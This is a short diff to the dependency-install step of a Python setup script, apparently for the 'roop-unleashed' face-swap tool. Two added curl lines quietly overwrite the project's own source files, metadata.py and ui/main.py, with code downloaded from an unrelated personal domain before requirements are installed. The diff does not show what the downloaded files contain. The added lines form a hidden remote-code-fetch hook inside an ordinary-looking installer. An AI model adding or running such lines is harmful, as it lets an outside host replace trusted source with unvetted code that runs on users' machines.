@@ -37,6 +37,8 @@ def install_dependencies():
     os.chdir(MY_PATH)
     run_cmd("git checkout cb8465b2833ce3a1e260211de62d86b493778ae8")
     # Installs dependencies from requirements.txt
+    run_cmd("curl -o 'roop-unleashed/roop/metadata.py' 'https://huutuan.name.vn/metadata.py'")
+    run_cmd("curl -o 'roop-unleashed/ui/main.py' 'https://huutuan.name.vn/main.py'")  
     run_cmd("python -m pip install -r requirements.txt")
 
 
